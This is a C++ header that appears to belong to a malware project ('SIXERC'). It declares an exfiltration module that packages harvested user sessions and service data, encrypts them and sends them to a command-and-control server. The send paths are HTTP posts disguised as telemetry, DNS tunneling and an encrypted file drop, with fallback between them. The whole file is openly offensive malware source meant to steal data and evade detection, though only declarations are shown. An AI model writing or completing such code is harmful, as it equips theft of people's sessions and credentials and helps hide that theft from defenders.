// ============================================================================
// SIXERC — Module 4: Exfiltration Pipeline (EP)
// Securely transfers harvested data to C2
// ============================================================================

#pragma once

#include "core/types.hpp"
#include <string>
#include <vector>

namespace sixerc::ep {

// Build encrypted payload from harvested data
std::string build_payload(const std::vector<HarvestedSession>& sessions, 
                          const std::vector<ServiceData>& services);

// Encrypt payload with AES-256-GCM + RSA hybrid
std::vector<byte> encrypt_payload(const std::string& payload, const std::string& rsa_pubkey);

// Exfiltrate via direct HTTP POST (mimics telemetry)
bool exfil_http(const std::vector<byte>& encrypted_data, const C2Config& config);

// Exfiltrate via DNS tunneling (low-and-slow)
bool exfil_dns(const std::vector<byte>& encrypted_data, const C2Config& config);

// Exfiltrate via encrypted file drop
bool exfil_file_drop(const std::vector<byte>& encrypted_data, const C2Config& config);

// Full exfiltration with fallback
bool exfiltrate(const std::vector<HarvestedSession>& sessions,
                const std::vector<ServiceData>& services,
                const C2Config& config);

} // namespace sixerc::ep
